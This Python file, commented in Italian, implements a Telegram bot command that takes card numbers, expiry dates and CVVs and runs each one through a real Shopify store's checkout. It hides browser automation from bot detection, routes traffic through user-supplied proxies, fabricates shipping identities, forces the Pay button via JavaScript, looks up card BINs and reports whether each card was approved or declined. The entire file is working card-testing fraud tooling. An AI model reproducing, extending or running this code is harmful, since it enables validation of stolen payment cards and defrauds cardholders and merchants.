from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import random
import time
import logging
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class Shopify1CheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium con proxy"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # USER AGENT
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            # CONFIGURA PROXY se fornito
            if self.proxy_url:
                logger.info(f"🔌 Usando proxy: {self.proxy_url}")
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.wait = WebDriverWait(self.driver, 20)
            logger.info("✅ Driver Shopify $1 inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def generate_italian_info(self):
        """Genera informazioni italiane per il checkout"""
        first_names = ['Marco', 'Luca', 'Giuseppe', 'Andrea', 'Roberto', 'Alessandro']
        last_names = ['Rossi', 'Bianchi', 'Verdi', 'Russo', 'Ferrari', 'Romano']
        streets = ['Via Roma', 'Corso Italia', 'Piazza della Signoria', 'Via dei Calzaiuoli', 'Borgo San Jacopo']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f"test{random.randint(1000,9999)}@test.com",
            'phone': f"3{random.randint(10,99)}{random.randint(1000000,9999999)}",
            'address': f"{random.choice(streets)} {random.randint(1, 150)}",
            'city': 'Firenze',
            'postal_code': f"50{random.randint(100, 999)}",
            'card_number': '4111111111111111',
            'expiry': '12/2028',
            'cvv': '123',
            'name_on_card': 'TEST CARD'
        }
    
    def add_to_cart(self):
        """Aggiunge il prodotto al carrello"""
        print("🛒 Aggiunta prodotto al carrello...")
        
        try:
            self.driver.get("https://earthesim.com/products/usa-esim?variant=42902995271773")
            time.sleep(5)
            
            add_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            add_button.click()
            print("✅ Prodotto aggiunto al carrello")
            
            print("⏳ Attendo caricamento...")
            time.sleep(5)
            return True
            
        except Exception as e:
            print(f"❌ Errore nell'aggiunta al carrello: {e}")
            return False
    
    def go_to_cart_and_checkout(self):
        """Va al carrello e clicca checkout"""
        try:
            print("🛒 Andando al carrello...")
            self.driver.get("https://earthesim.com/cart")
            time.sleep(5)
            
            checkout_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button#checkout")))
            checkout_button.click()
            print("✅ Cliccato 'Check out'")
            
            print("⏳ Attendo reindirizzamento a checkout...")
            time.sleep(8)
            return True
            
        except Exception as e:
            print(f"❌ Errore nel checkout: {e}")
            return False
    
    def fill_shipping_info(self, info):
        """Compila le informazioni di spedizione"""
        print("📦 Compilazione informazioni di spedizione...")
        
        try:
            print("⏳ Attendo caricamento pagina checkout...")
            time.sleep(10)
            
            current_url = self.driver.current_url
            print(f"🔍 URL corrente: {current_url}")
            
            # EMAIL
            print("🔍 Cerco campo email...")
            email_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#email")))
            email_field.clear()
            email_field.send_keys(info['email'])
            print(f"✅ Email inserita: {info['email']}")
            time.sleep(1)
            
            # FIRST NAME
            print("🔍 Cerco campo first name...")
            first_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField0")
            first_name_field.clear()
            first_name_field.send_keys(info['first_name'])
            print(f"✅ First Name inserito: {info['first_name']}")
            time.sleep(1)
            
            # LAST NAME
            print("🔍 Cerco campo last name...")
            last_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField1")
            last_name_field.clear()
            last_name_field.send_keys(info['last_name'])
            print(f"✅ Last Name inserito: {info['last_name']}")
            time.sleep(1)
            
            # ADDRESS
            print("🔍 Cerco campo address...")
            address_field = self.driver.find_element(By.CSS_SELECTOR, "input#billing-address1")
            address_field.clear()
            address_field.send_keys(info['address'])
            print(f"✅ Address inserito: {info['address']}")
            time.sleep(1)
            
            # CITY
            print("🔍 Cerco campo city...")
            city_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField4")
            city_field.clear()
            city_field.send_keys(info['city'])
            print(f"✅ City inserita: {info['city']}")
            time.sleep(1)
            
            # POSTAL CODE
            print("🔍 Cerco campo postal code...")
            postal_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField3")
            postal_field.clear()
            postal_field.send_keys(info['postal_code'])
            print(f"✅ Postal Code inserito: {info['postal_code']}")
            time.sleep(1)
            
            # PHONE NUMBER
            print("🔍 Cerco campo phone...")
            phone_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField5")
            phone_field.clear()
            phone_field.send_keys(info['phone'])
            print(f"✅ Phone inserito: {info['phone']}")
            time.sleep(1)
            
            return True
            
        except Exception as e:
            print(f"❌ Errore nella compilazione shipping: {e}")
            return False
    
    def fill_payment_info(self, info, card_data):
        """Compila le informazioni di pagamento"""
        print("💳 Compilazione informazioni di pagamento...")
        
        try:
            time.sleep(3)
            
            # I campi sono in iframe separati di Shopify PCI
            print("🔍 Switchando agli iframe di Shopify PCI...")
            
            # CARD NUMBER - Iframe 2
            print("🔍 Cerco iframe card number...")
            card_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-number']")
            self.driver.switch_to.frame(card_iframe)
            
            card_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#number")))
            card_field.clear()
            for char in card_data['number']:
                card_field.send_keys(char)
                time.sleep(0.05)
            print(f"✅ Card number inserito: {card_data['number']}")
            
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # EXPIRY DATE
            print("🔍 Cerco iframe expiry...")
            expiry_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-expiry']")
            self.driver.switch_to.frame(expiry_iframe)
            
            expiry_field = self.driver.find_element(By.CSS_SELECTOR, "input#expiry")
            
            # Usa JavaScript per impostare il valore
            expiry_value = f"{card_data['month']}/{card_data['year']}"
            self.driver.execute_script("arguments[0].value = arguments[1];", expiry_field, expiry_value)
            self.driver.execute_script("""
                arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('blur', { bubbles: true }));
            """, expiry_field)
            
            actual_value = expiry_field.get_attribute('value')
            print(f"✅ Expiry inserito: '{actual_value}'")
            
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # CVV - Iframe 4
            print("🔍 Cerco iframe CVV (Security code)...")
            cvv_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-verification_value']")
            self.driver.switch_to.frame(cvv_iframe)
            
            cvv_field = self.driver.find_element(By.CSS_SELECTOR, "input#verification_value")
            cvv_field.clear()
            
            # Inserisci CVV con JavaScript
            self.driver.execute_script("arguments[0].value = arguments[1];", cvv_field, card_data['cvv'])
            self.driver.execute_script("""
                arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('blur', { bubbles: true }));
            """, cvv_field)
            
            actual_cvv = cvv_field.get_attribute('value')
            print(f"✅ CVV (Security code) inserito: '{actual_cvv}'")
            
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # NAME ON CARD - Iframe 7
            print("🔍 Cerco iframe name on card...")
            name_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-name']")
            self.driver.switch_to.frame(name_iframe)
            
            name_field = self.driver.find_element(By.CSS_SELECTOR, "input#name")
            name_field.clear()
            
            # Inserisci nome con JavaScript
            self.driver.execute_script("arguments[0].value = arguments[1];", name_field, info['name_on_card'])
            self.driver.execute_script("""
                arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('blur', { bubbles: true }));
            """, name_field)
            
            actual_name = name_field.get_attribute('value')
            print(f"✅ Name on card inserito: '{actual_name}'")
            
            self.driver.switch_to.default_content()
            time.sleep(2)
            
            # FORZA L'AGGIORNAMENTO DELLA VALIDAZIONE
            print("🔄 Forzo aggiornamento validazione...")
            
            # Clicca su un campo neutro per forzare il blur e la validazione
            email_field = self.driver.find_element(By.CSS_SELECTOR, "input#email")
            email_field.click()
            time.sleep(1)
            
            # Oppure usa JavaScript per forzare la validazione di tutti i campi
            self.driver.execute_script("""
                // Forza la validazione di tutti i campi di pagamento
                if (window.Shopify && window.Shopify.dynamicCheckout) {
                    // Trigger della validazione Shopify
                    const event = new Event('validate', { bubbles: true });
                    document.dispatchEvent(event);
                }
                
                // Forza il re-check di tutti i campi
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.dispatchEvent(new Event('blur', { bubbles: true }));
                });
            """)
            
            time.sleep(3)
            
            return True
            
        except Exception as e:
            print(f"❌ Errore nella compilazione pagamento: {e}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False
    
    def complete_purchase(self):
        """Completa l'acquisto cliccando Pay Now"""
        print("🚀 Completamento acquisto...")
        
        try:
            time.sleep(3)
            
            # Verifica se il bottone è abilitato
            pay_button = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "button#checkout-pay-button")))
            
            is_enabled = pay_button.is_enabled()
            print(f"🔍 Bottone Pay Now abilitato: {is_enabled}")
            
            if not is_enabled:
                print("🔄 Bottone disabilitato, provo a forzare l'abilitazione...")
                
                # Forza ulteriore validazione
                self.driver.execute_script("""
                    // Forza l'aggiornamento dello stato del bottone
                    if (window.Shopify && window.Shopify.dynamicCheckout) {
                        // Trigger dell'evento di aggiornamento
                        const event = new Event('paymentMethodUpdated', { bubbles: true });
                        document.dispatchEvent(event);
                    }
                    
                    // Forza il blur su tutti i campi
                    document.activeElement.blur();
                """)
                
                time.sleep(3)
                
                # Verifica nuovamente
                is_enabled = pay_button.is_enabled()
                print(f"🔍 Bottone Pay Now dopo forzatura: {is_enabled}")
            
            if is_enabled:
                pay_button.click()
                print("✅ Cliccato 'Pay Now'")
                
                print("⏳ Attendo elaborazione pagamento...")
                time.sleep(10)
                return True
            else:
                print("❌ Bottone ancora disabilitato, verifico errori...")
                
                # Controlla errori specifici
                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                error_messages = [
                    "valid expiration date",
                    "security code", 
                    "name on card",
                    "enter your name"
                ]
                
                for error in error_messages:
                    if error in page_text:
                        print(f"   - Trovato errore: {error}")
                
                # Prova a cliccare comunque (a volte la UI non si aggiorna)
                try:
                    print("🔄 Provo a cliccare comunque il bottone...")
                    self.driver.execute_script("arguments[0].click();", pay_button)
                    print("✅ Cliccato 'Pay Now' via JavaScript")
                    time.sleep(10)
                    return True
                except:
                    print("❌ Impossibile cliccare il bottone")
                    return False
                
        except Exception as e:
            print(f"❌ Errore nel completamento acquisto: {e}")
            return False
    
    def analyze_result(self):
        """Analizza il risultato della transazione"""
        print("🔍 Analisi risultato transazione...")
        
        try:
            time.sleep(8)
            current_url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            print(f"📄 URL corrente: {current_url}")
            
            if "your card was declined" in page_text:
                print("\n" + "=" * 50)
                print("❌ CARTA DECLINATA: Your card was declined.")
                print("=" * 50)
                return "DECLINED"
            
            elif "thank you" in page_text or "order confirmed" in page_text:
                print("\n" + "=" * 50)
                print("✅ PAGAMENTO EFFETTUATO: Payment successful!")
                print("=" * 50)
                return "APPROVED"
            
            elif "3d" in page_text or "secure" in page_text:
                print("\n" + "=" * 50)
                print("🛡️ 3D SECURE RICHIESTO: Additional verification required.")
                print("=" * 50)
                return "3DS_REQUIRED"
            
            else:
                print("\n" + "=" * 50)
                print("🔍 STATO SCONOSCIUTO: Controlla manualmente.")
                print("=" * 50)
                return "UNKNOWN"
            
        except Exception as e:
            print(f"💥 ERRORE nell'analisi: {str(e)}")
            return "ERROR"
    
    def process_payment(self, card_data):
        """Processa il pagamento Shopify $1"""
        try:
            print(f"🚀 Inizio processo Shopify $1 con proxy: {self.proxy_url}")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            test_info = self.generate_italian_info()
            
            # Sostituisci i dati della carta con quelli forniti
            test_info['card_number'] = card_data['number']
            test_info['expiry'] = f"{card_data['month']}/{card_data['year']}"
            test_info['cvv'] = card_data['cvv']
            
            print(f"👤 Informazioni di test:")
            print(f"   Nome: {test_info['first_name']} {test_info['last_name']}")
            print(f"   Email: {test_info['email']}")
            print(f"   Telefono: {test_info['phone']}")
            print(f"   Indirizzo: {test_info['address']}, {test_info['city']}")
            print(f"💳 Carta: {test_info['card_number']} | Scadenza: {test_info['expiry']}")
            print(f"   CVV: {test_info['cvv']} | Name: {test_info['name_on_card']}")
            
            if not self.add_to_cart():
                return "ERROR_ADD_TO_CART"
            
            if not self.go_to_cart_and_checkout():
                return "ERROR_CHECKOUT"
            
            if not self.fill_shipping_info(test_info):
                return "ERROR_SHIPPING_INFO"
            
            if not self.fill_payment_info(test_info, card_data):
                return "ERROR_PAYMENT_INFO"
            
            if not self.complete_purchase():
                return "ERROR_COMPLETE_PURCHASE"
            
            result = self.analyze_result()
            return result
            
        except Exception as e:
            print(f"💥 Errore durante il test: {e}")
            return f"ERROR - {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_shopify1_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    """
    Processa una carta su Shopify $1
    """
    processor = Shopify1CheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': expiry[:2],
        'year': "20" + expiry[2:],
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def s1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with Shopify $1"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 's1')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text(
            "🛍️ **Shopify $1 Check**\n\n"
            "Usage: /s1 number|month|year|cvv [proxy]\n\n"
            "Example: /s1 4111111111111111|12|2028|123\n"
            "With proxy: /s1 4111111111111111|12|2028|123 http://proxy-ip:port"
        )
        return
    
    # COMBINE ALL ARGUMENTS
    full_input = ' '.join(context.args)
    logger.info(f"🔍 Shopify $1 input: {full_input}")
    
    # FIND PROXY
    import re
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    # REMOVE PROXY FROM INPUT
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
        logger.info(f"🔌 Shopify $1 proxy: {proxy_url}")
    else:
        card_input = full_input
    
    # CLEAN SPACES
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    if proxy_url:
        wait_message = await update.message.reply_text(f"🔄 Checking Shopify $1 with proxy...")
    else:
        wait_message = await update.message.reply_text("🔄 Checking Shopify $1...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card format: {parsed_card['error']}")
            return
        
        logger.info(f"🎯 Shopify $1 card: {parsed_card['number'][:6]}******{parsed_card['number'][-4:]}")
        
        # GET BIN INFORMATION
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        # EXECUTE SHOPIFY $1 CHECK
        result = process_shopify1_payment(
            parsed_card['number'],
            parsed_card['month'] + parsed_card['year'][-2:],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        # FORMAT RESPONSE LIKE AUTHNET
        if result == "APPROVED":
            status_emoji = "✅"
            title = "Approved"
        elif result == "DECLINED":
            status_emoji = "❌" 
            title = "Declined"
        elif result == "3DS_REQUIRED":
            status_emoji = "🛡️"
            title = "3DS Required"
        else:
            status_emoji = "⚠️"
            title = result
        
        response = f"""{title} {status_emoji}

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: SHOPIFY $1
Response: {result}"""

        # ADD BIN INFO IF AVAILABLE
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in s1_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
